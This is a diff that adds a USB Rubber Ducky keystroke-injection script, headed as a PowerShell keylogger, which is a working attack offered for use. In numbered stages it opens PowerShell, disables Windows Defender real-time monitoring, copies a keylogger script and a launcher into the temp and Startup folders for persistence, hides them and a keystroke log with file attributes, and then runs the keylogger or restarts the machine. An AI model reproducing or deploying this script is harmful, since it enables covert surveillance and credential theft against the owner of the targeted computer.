@@ -1,0 +1,40 @@
+REM Powershell Keylogger for the USB RubberDucky
+REM created by : C0SM0
+
+REM STAGE1
+REM open runbox
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM STAGE2
+REM disables defender
+STRING Set-MpPreference -DisableRealtimeMonitoring $true;
+
+REM STAGE 3
+REM move files to appropiate directories
+REM change 'L' to the name of your ducky
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\l.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+ENTER
+DELAY 200
+
+REM STAGE 4
+REM hide files, generate log
+STRING cd $env:temp;echo "">"$env:UserName.log";attrib +h +s +r l.ps1;attrib +h +s +r "$env:UserName.log";cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";attrib +h +s +r c.cmd;
+
+REM comment out the option you decide NOT to use
+
+REM STAGE 5 [OPTION1]
+REM run keylogger
+STRING .\c.cmd;exit
+
+REM STAGE 5 [OPTION2]
+REM restart computer
+STRING shutdown /r
+
+REM STAGE 6
+REM deploy
+ENTER
